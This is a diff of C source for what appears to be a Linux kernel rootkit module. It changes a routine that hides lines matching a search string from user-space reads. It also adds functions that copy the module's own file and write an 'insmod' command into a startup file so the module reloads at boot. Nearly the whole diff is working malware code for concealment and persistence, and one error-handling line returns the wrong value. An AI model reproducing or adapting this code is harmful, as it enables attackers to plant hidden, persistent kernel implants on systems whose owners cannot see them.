@@ -7,6 +7,7 @@
 #include <asm/current.h>
 #include <linux/cred.h>
 #include <linux/errno.h>
+#include <linux/fs.h>
 #include <linux/kobject.h>
 #include <linux/list.h>
 #include <linux/mm.h>
@@ -556,13 +557,8 @@ size_t hide_lines(char __user *const s_buffer, const size_t sz_len, const char *
 
     IF_U (strnstr(s_buffer_k, s_search, sz_len) != NULL) {
         pr_dev_info("  * Hiding line\n");
-        // Set the user buffer to "\n" and return size 1
-        IF_U (copy_to_user(s_buffer, "\n", 1) != 0) {
-            pr_dev_err("* Failed to copy data to user\n");
-            sz_ret = sz_len;
-            goto free_ret;
-        }
-        IF_U (clear_user(s_buffer, sz_len) != 0) {
+        // Clear user buffer and return size 1 (since 0 would mean EOF)
+        IF_U (clear_user(s_buffer + 1, sz_len - 1) != 0) {
             pr_dev_err("* Failed to clear user buffer\n");
         }
         sz_ret = 1;
@@ -577,92 +573,161 @@ ret:
     return sz_ret;
 }
 
-// size_t hide_lines(char __user *const s_buffer, const size_t sz_len, const char *const s_search)
-// {
-//     size_t sz_ret      = sz_len; // Return buffer size
-//     size_t sz_line_len = 0;      // Line length
-//     char *s_buffer_k   = NULL;   // Kernel buffer
-//     char *s_result     = NULL;   // Result buffer
-//     char *s_line       = NULL;   // Line pointer
-//     char *s_end        = NULL;   // End of line pointer
+int kernel_copy_file(file_t *const p_src_file, file_t *const p_dst_file)
+{
+    int i32_err        = 0;    // Error code
+    char *s_buf        = NULL; // Temp kernel buffer
+    ssize_t sz_read    = 0;    // Number of bytes read
+    ssize_t sz_write   = 0;    // Number of bytes written
+    loff_t i64_src_pos = 0;    // Source file position
+    loff_t i64_dst_pos = 0;    // Destination file position
 
-//     pr_dev_info("Hiding lines...\n");
+    pr_dev_info("Copying file...\n");
 
-//     s_buffer_k = kvmalloc(sz_len, GFP_KERNEL);
-//     IF_U (s_buffer_k == NULL) {
-//         pr_dev_err("* Failed to allocate kernel buffer\n");
-//         goto ret;
-//     }
+    s_buf = kmalloc(PAGE_SIZE, GFP_KERNEL);
+    IF_U (s_buf == NULL) {
+        pr_dev_err("* Failed to allocate kernel buffer\n");
+        i32_err = -ENOMEM;
+        goto ret;
+    }
 
-//     IF_U (copy_from_user(s_buffer_k, s_buffer, sz_len) != 0) {
-//         pr_dev_err("* Failed to copy buffer from user\n");
-//         goto free_ret;
-//     }
+    while ((sz_read = kernel_read(p_src_file, s_buf, PAGE_SIZE, &i64_src_pos)) > 0) {
+        pr_dev_info("* Read %zd bytes from file\n", sz_read);
+        pr_dev_info("  * Offset: %lld\n", i64_src_pos);
+        sz_write = kernel_write(p_dst_file, s_buf, sz_read, &i64_dst_pos);
+        IF_U (sz_write < 0) {
+            pr_dev_err("* Failed to write to file\n");
+            i32_err = sz_read;
+            goto free_ret;
+        }
+        pr_dev_info("* Wrote %zd bytes to file\n", sz_write);
+        pr_dev_info("  * Offset: %lld\n", i64_dst_pos);
+    }
 
-//     pr_dev_info("* Buffer: %s\n", s_buffer_k);
+    IF_U (sz_read < 0) {
+        pr_dev_err("* Failed to read from file\n");
+        i32_err = sz_read;
+        goto free_ret;
+    }
 
-//     s_result = kvmalloc(sz_len, GFP_KERNEL);
-//     IF_U (s_result == NULL) {
-//         pr_dev_err("* Failed to allocate result buffer\n");
-//         goto free_ret;
-//     }
+free_ret:
+    kfree(s_buf);
+ret:
+    return i32_err;
+}
 
-//     s_line = s_buffer_k;
+int copy_module_file(void)
+{
+    int i32_err        = 0;    // Error code
+    char *s_src_name   = NULL; // Source file name
+    char *s_dst_name   = NULL; // Destination file name
+    file_t *p_src_file = NULL; // Source file pointer
+    file_t *p_dst_file = NULL; // Destination file pointer
 
-//     while ((s_end = strnchr(s_line, sz_ret, '\n')) != NULL) {
-//         pr_dev_info("* Line: %s\n", s_line);
-//         sz_line_len = s_end - s_line + 1;
+    pr_dev_info("Copying module file...\n");
 
-//         IF_U (strnstr(s_line, s_search, sz_line_len - 1) != NULL) {
-//             pr_dev_info("  * Hiding line\n");
-//             sz_ret -= sz_line_len;
-//             s_line = s_end + 1;
-//             continue;
-//         }
+    if (strnstr(THIS_MODULE->name, "_mod", strlen(THIS_MODULE->name)) != NULL) {
+        pr_dev_info("* Module file already copied\n");
+        goto ret;
+    }
 
-//         pr_dev_info("  * Keeping line\n");
+    s_src_name = kzalloc(PATH_MAX, GFP_KERNEL);
+    IF_U (s_src_name == NULL) {
+        pr_dev_err("* Failed to allocate kernel buffer\n");
+        i32_err = -ENOMEM;
+        goto ret;
+    }
 
-//         strncat(s_result, s_line, sz_line_len);
-//         s_line = s_end + 1;
-//     }
+    s_dst_name = kzalloc(PATH_MAX, GFP_KERNEL);
+    IF_U (s_dst_name == NULL) {
+        pr_dev_err("* Failed to allocate kernel buffer\n");
+        i32_err = -ENOMEM;
+        goto free_src;
+    }
 
-//     /*
-//     while ((s_line = strsep(&s_buffer_k, "\n")) != NULL) {
-//         if (!*s_line) {
-//             continue;
-//         }
+    snprintf(s_src_name, PATH_MAX, MOD_FILE, THIS_MODULE->name);
+    snprintf(s_dst_name, PATH_MAX, MOD_COPY, THIS_MODULE->name);
+    pr_dev_info("* Source file: %s\n", s_src_name);
+    pr_dev_info("* Dest   file: %s\n", s_dst_name);
 
-//         pr_dev_info("* Line: %s\n", s_line);
+    p_src_file = filp_open(s_src_name, O_RDONLY, 0);
+    IF_U (IS_ERR_OR_NULL(p_src_file)) {
+        pr_dev_err("* Failed to open source file\n");
+        i32_err = PTR_ERR(p_src_file);
+        goto free_dst;
+    }
 
-//         if (strnstr(s_line, s_search, sz_len) != NULL) {
-//             pr_dev_info("  * Hiding line\n");
-//             continue;
-//         }
+    p_dst_file = filp_open(s_dst_name, O_CREAT | O_WRONLY | O_TRUNC, 0600);
+    IF_U (IS_ERR_OR_NULL(p_dst_file)) {
+        pr_dev_err("* Failed to open destination file\n");
+        i32_err = PTR_ERR(p_dst_file);
+        goto close_src;
+    }
 
-//         pr_dev_info("  * Keeping line\n");
-//     }
-//     */
+    i32_err = kernel_copy_file(p_src_file, p_dst_file);
+    IF_U (i32_err != 0) {
+        pr_dev_err("* Failed to copy file\n");
+        goto close_dst;
+    }
 
-//     pr_dev_info("* Result: %s\n", s_result);
+    pr_dev_info("* Copied file\n");
 
-//     IF_U (copy_to_user(s_buffer, s_result, sz_ret) != 0) {
-//         pr_dev_err("* Failed to copy buffer to user\n");
-//         sz_ret = sz_len;
-//         goto free_res;
-//     }
+close_dst:
+    IF_L (!IS_ERR_OR_NULL(p_dst_file)) {
+        filp_close(p_dst_file, NULL);
+    }
+close_src:
+    IF_L (!IS_ERR_OR_NULL(p_src_file)) {
+        filp_close(p_src_file, NULL);
+    }
+free_dst:
+    kfree(s_dst_name);
+free_src:
+    kfree(s_src_name);
+ret:
+    return i32_err;
+}
 
-//     IF_U (sz_ret < sz_len) {
-//         // Erase the rest of the user buffer to avoid leaking data
-//         IF_U (clear_user(s_buffer + sz_ret, sz_len - sz_ret) != 0) {
-//             pr_dev_err("* Failed to clear user buffer\n");
-//             goto free_res;
-//         }
-//     }
+int create_locald_file(void)
+{
+    int i32_err      = 0;    // Error code
+    file_t *p_file   = NULL; // File pointer
+    char *s_contents = NULL; // Kernel buffer for file contents
 
-// free_res:
-//     kvfree(s_result);
-// free_ret:
-//     kvfree(s_buffer_k);
-// ret:
-//     return sz_ret;
-// }
+    pr_dev_info("Creating file %s...\n", LOCALD_FILE);
+
+    p_file = filp_open(LOCALD_FILE, O_CREAT | O_WRONLY | O_TRUNC, 0700);
+    IF_U (IS_ERR_OR_NULL(p_file)) {
+        pr_dev_err("* Failed to open file\n");
+        i32_err = PTR_ERR(p_file);
+        goto ret;
+    }
+
+    s_contents = kzalloc(LOCALD_SIZE, GFP_KERNEL);
+    IF_U (s_contents == NULL) {
+        pr_dev_err("* Failed to allocate kernel buffer\n");
+        i32_err = -ENOMEM;
+        goto close;
+    }
+
+    snprintf(s_contents, LOCALD_SIZE, "insmod " MOD_COPY "\n", THIS_MODULE->name);
+    pr_dev_info("* File contents: %s\n", s_contents);
+
+    i32_err = kernel_write(p_file, s_contents, strlen(s_contents), NULL);
+    IF_U (i32_err < 0) {
+        pr_dev_err("* Failed to write to file\n");
+        goto free_close;
+    }
+
+    pr_dev_info("* Wrote %d bytes to file\n", i32_err);
+    i32_err = 0;
+
+free_close:
+    kfree(s_contents);
+close:
+    IF_L (!IS_ERR_OR_NULL(p_file)) {
+        filp_close(p_file, NULL);
+    }
+ret:
+    return i32_err;
+}
